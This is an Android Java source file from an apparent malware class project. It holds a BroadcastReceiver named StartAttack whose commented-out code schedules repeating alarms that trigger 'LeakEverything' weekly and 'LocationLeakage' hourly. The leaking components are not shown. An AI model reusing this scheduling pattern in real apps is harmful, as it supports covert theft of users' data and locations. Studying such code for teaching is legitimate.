package com.malwareclass.malwareproject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.File;
import java.util.Calendar;

public class StartAttack extends BroadcastReceiver {

    private static final String TAG = "StartAttack";

    private static final Calendar cal = Calendar.getInstance();
    private static final Long TIME_LONG = 1000L * 60 * 60 * 24 * 7;
    private static final Long TIME_SHORT = 1000L * 60 * 60;


    @Override
    public void onReceive(Context context, Intent intent) {

        Log.d(TAG, "Started");

        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

        /* PAUSE

        // leak everything
        Intent leak = new Intent(context, LeakEverything.class);
        leak.setAction("LEAK");
        PendingIntent pendingIntent_leak = PendingIntent.getBroadcast(context, 0, leak, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME_LONG, pendingIntent_leak);


        // Location leakage
        Intent locationLeakage = new Intent(context, LocationLeakage.class);
        locationLeakage.setAction("LOCATION_LEAKAGE");
        PendingIntent pendingIntent_location = PendingIntent.getBroadcast(context, 0, locationLeakage, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), TIME_SHORT, pendingIntent_location);

        */

        Log.i(TAG, "Ended");


    }
}
